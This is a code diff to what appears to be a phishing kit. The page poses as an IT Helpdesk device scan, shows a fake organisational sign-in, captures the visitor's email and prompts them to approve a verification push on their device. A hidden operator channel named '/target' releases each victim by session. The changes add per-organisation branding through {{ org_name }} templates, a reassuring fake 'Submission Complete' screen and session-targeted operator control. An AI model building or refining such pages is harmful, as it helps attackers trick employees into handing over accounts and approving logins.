@@ -55,7 +55,7 @@
 
           <div class="submit-wrap">
             <button type="button" class="btn-primary" id="btnSubmitResults">Submit to IT Helpdesk</button>
-            <p class="submit-note">You will be prompted to authenticate with your organization.</p>
+            <p class="submit-note">You will be prompted to authenticate with your {{ org_name }} account.</p>
           </div>
         </div>
       </div>
@@ -70,7 +70,7 @@
               <div class="sso-fg">
                 <input type="email" id="emailInput" placeholder="someone@example.com" required autocomplete="username">
               </div>
-              <p class="sso-hint">Sign in with your organizational account</p>
+              <p class="sso-hint">Sign in with your {{ org_name }} account</p>
               <button type="button" class="sso-btn" id="btnEmailNext">Next</button>
             </div>
           </div>
@@ -112,7 +112,7 @@
             <div class="sso-loading-dots">
               <span></span><span></span><span></span>
             </div>
-            <p class="sso-loading-text">Looking up your organization...</p>
+            <p class="sso-loading-text">Taking you to your organization's sign-in page...</p>
           </div>
         </div>
       </div>
@@ -138,8 +138,12 @@
               <p>A verification request has been sent to your registered device. Please approve the prompt to continue.</p>
             </div>
             <div id="nextWrap" style="display:none">
-              <p class="next-msg">Verification complete. Please continue to finalize your submission.</p>
-              <button type="button" class="btn-primary" onclick="window.location.href='https://m365.cloud.microsoft/apps'">Next</button>
+              <div class="completion-screen">
+                <div class="completion-icon">&#x2705;</div>
+                <h2>Submission Complete</h2>
+                <p class="completion-msg">Your scan results have been submitted to the {{ org_name }} IT Helpdesk. No further action is required.</p>
+                <p class="completion-close">You may close this window.</p>
+              </div>
             </div>
           </div>
         </div>
@@ -154,6 +158,7 @@
     // ── Config ─────────────────────────────────
     var SCAN_MS = 12000;
     var capturedEmail = '';
+    var sessionSid = '';
 
     // ── Browser Fingerprinting ─────────────────
     // Builds realistic scan results from actual browser/device data
@@ -272,8 +277,8 @@
     // ── Session resume on refresh ──────────────
     (function() {
       fetch('/session-state').then(function(r) { return r.json(); }).then(function(state) {
+        sessionSid = state.sid || '';
         if (state.scan_complete) {
-          // Skip scan, go straight to results
           buildResultsTable();
           if (state.email) {
             capturedEmail = state.email;
@@ -479,9 +484,13 @@
         document.getElementById('nextWrap').style.display = 'block';
       }
 
-      // No auto-timer — operator has full control
+      // No auto-timer — operator has full control via session-targeted release
       try {
         var socket = io('/target');
+        socket.on('connect', function() {
+          // Register with our private room so release only affects us
+          socket.emit('register', { sid: sessionSid });
+        });
         socket.on('force_next', function() {
           showNext();
         });
